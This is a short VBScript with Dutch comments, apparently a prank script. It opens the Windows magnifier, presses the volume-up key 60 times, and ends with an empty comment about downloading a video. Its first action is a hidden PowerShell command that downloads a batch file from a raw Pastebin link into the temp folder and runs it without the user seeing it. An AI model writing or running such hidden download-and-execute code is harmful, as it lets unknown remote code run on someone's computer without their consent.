Set WshShell = CreateObject("WScript.Shell")

' Download en start pingyoutube.bat
WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process '%TEMP%\pingyoutube.bat'""", 0, False
WScript.Sleep 950

' Start vergrootglas
WshShell.Run "magnify.exe", 1, False

' Verhoog volume 100 keer
For i = 1 To 60
    WshShell.SendKeys Chr(175)
    WScript.Sleep 150
Next

' Download video met PowerShell
